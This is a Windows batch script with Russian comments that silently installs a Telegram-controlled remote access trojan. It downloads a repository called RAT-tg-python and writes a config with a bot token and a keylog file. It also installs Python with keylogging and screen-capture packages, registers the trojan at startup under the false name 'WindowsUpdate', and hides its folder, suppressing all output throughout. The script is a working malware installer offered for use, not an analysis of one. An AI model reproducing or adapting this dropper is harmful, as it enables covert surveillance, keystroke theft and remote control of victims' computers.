@echo off
setlocal enabledelayedexpansion

REM Настройки
set "BOT_TOKEN=..."
set "ADMIN_ID=..."

set "REPO_URL=https://github.com/kripersi/RAT-tg-python/archive/refs/heads/main.zip"
set "INSTALL_DIR=%LocalAppData%\RAT_browser"
set "PYTHON_PATH=%LocalAppData%\Programs\Python\Python312\python.exe"
set "SCRIPT_PATH=%INSTALL_DIR%\main.py"
set "CONFIG_PATH=%INSTALL_DIR%\config.py"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_VALUE=WindowsUpdate"
set "ZIP_PATH=%TEMP%\repo.zip"
set "EXTRACT_DIR=%TEMP%\repo_extract"

REM Создание директории
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

REM Скачивание репозитория
curl -s -L -o "%ZIP_PATH%" "%REPO_URL%" >nul 2>&1

REM Распаковка
powershell -command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_DIR%' -Force" >nul 2>&1

REM Копирование файлов в целевую папку
xcopy "%EXTRACT_DIR%\RAT-tg-python-main\*" "%INSTALL_DIR%\" /E /Y /Q >nul 2>&1

REM Создание config.py
echo import os > "%CONFIG_PATH%"
echo import telepot >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Основные настройки >> "%CONFIG_PATH%"
echo KNOWN_IDS = ['%ADMIN_ID%'] >> "%CONFIG_PATH%"
echo TOKEN = '%BOT_TOKEN%' >> "%CONFIG_PATH%"
echo bot = telepot.Bot(TOKEN) >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Пути >> "%CONFIG_PATH%"
echo USER = os.environ.get("USERNAME") >> "%CONFIG_PATH%"
echo APPDATA = os.environ.get("APPDATA") >> "%CONFIG_PATH%"
echo BASE_DIR = os.getcwd() >> "%CONFIG_PATH%"
echo LOG_DIR = os.path.join(BASE_DIR, 'logs') >> "%CONFIG_PATH%"
echo SCRIPTS_DIR = os.path.join(BASE_DIR, 'scripts') >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Файлы логов >> "%CONFIG_PATH%"
echo LOG_FILE = os.path.join(LOG_DIR, 'user_log.txt') >> "%CONFIG_PATH%"
echo KEYLOG_FILE = os.path.join(LOG_DIR, 'keylogs.txt') >> "%CONFIG_PATH%"
echo. >> "%CONFIG_PATH%"
echo # Убедимся, что папки существуют >> "%CONFIG_PATH%"
echo os.makedirs(LOG_DIR, exist_ok=True) >> "%CONFIG_PATH%"
echo os.makedirs(SCRIPTS_DIR, exist_ok=True) >> "%CONFIG_PATH%"

REM Удаляем add_packages.py и requirements.txt
if exist "%INSTALL_DIR%\requirements.txt" del "%INSTALL_DIR%\requirements.txt" >nul 2>&1

REM Очистка временных файлов
del "%ZIP_PATH%" >nul 2>&1
rmdir /s /q "%EXTRACT_DIR%" >nul 2>&1

REM Проверка Python
if not exist "%PYTHON_PATH%" (
    curl -s -o "%TEMP%\python312.exe" "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe" >nul 2>&1
    "%TEMP%\python312.exe" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1 >nul 2>&1
    timeout /t 3 /nobreak >nul 2>&1
    del "%TEMP%\python312.exe" >nul 2>&1
)

REM Установка необходимых пакетов
"%PYTHON_PATH%" -m pip install telepot pynput opencv-python pyautogui Pillow keyboard requests --quiet >nul 2>&1

REM Добавление в автозагрузку
reg add "%REG_KEY%" /v "%REG_VALUE%" /t REG_SZ /d "\"%PYTHON_PATH%\" \"%SCRIPT_PATH%\"" /f >nul 2>&1

REM Скрытые атрибуты
attrib +h "%INSTALL_DIR%" /s /d >nul 2>&1

:end
endlocal